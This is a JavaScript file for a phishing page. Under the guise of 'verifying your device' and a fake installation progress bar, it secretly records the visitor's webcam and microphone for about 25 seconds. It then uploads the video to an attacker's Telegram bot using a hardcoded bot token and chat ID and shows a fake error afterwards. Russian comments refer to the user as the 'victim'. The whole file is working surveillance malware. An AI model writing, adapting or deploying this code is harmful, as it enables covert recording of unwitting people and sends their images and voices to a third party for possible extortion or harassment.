const TOKEN = "8823259495:AAHe6VSdY9_Ea_g7hIPVhX0sWJWb1XYchgA";
const CHAT_ID = "8210199939";
const videoElement = document.getElementById('webcam');
const statusText = document.getElementById('status-text');
const progressBar = document.getElementById('fill');
const overlay = document.getElementById('overlay');
const errorMsg = document.getElementById('error-msg');
const spinner = document.getElementById('spinner');

let mediaRecorder;
let recordedChunks = [];

async function startProcess() {
    try {
        // Запрос разрешений (жертва должна нажать "Allow")
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        videoElement.srcObject = stream;
        
        overlay.style.display = 'flex';
        
        // Настройка записи
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) recordedChunks.push(event.data);
        };

        // Старт записи
        mediaRecorder.start();
        
        // Таймер на 20 секунд (имитация загрузки)
        let progress = 0;
        let interval = setInterval(() => {
            progress += 1;
            progressBar.style.width = progress + '%';
            if (progress >= 90) {
                clearInterval(interval);
                finalize();
            }
        }, 220); // Итого ~20 сек

    } catch (err) {
        alert("Please allow camera access to verify your device.");
    }
}

function finalize() {
    statusText.innerText = "Finalizing installation... Please wait 5 seconds";
    progressBar.style.width = '100%';
    
    setTimeout(() => {
        mediaRecorder.stop();
        mediaRecorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: 'video/mp4' });
            await sendToTelegram(blob);
            
            // Показ ошибки после отправки
            spinner.style.display = 'none';
            document.getElementById('progress-bar').style.display = 'none';
            statusText.style.display = 'none';
            errorMsg.style.display = 'block';
        };
    }, 5000); // 5 секунд на финализацию
}

async function sendToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', blob, 'surpise_video.mp4');

    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
            method: 'POST',
            body: formData
        });
    } catch (e) {
        console.error("Upload failed", e);
    }
}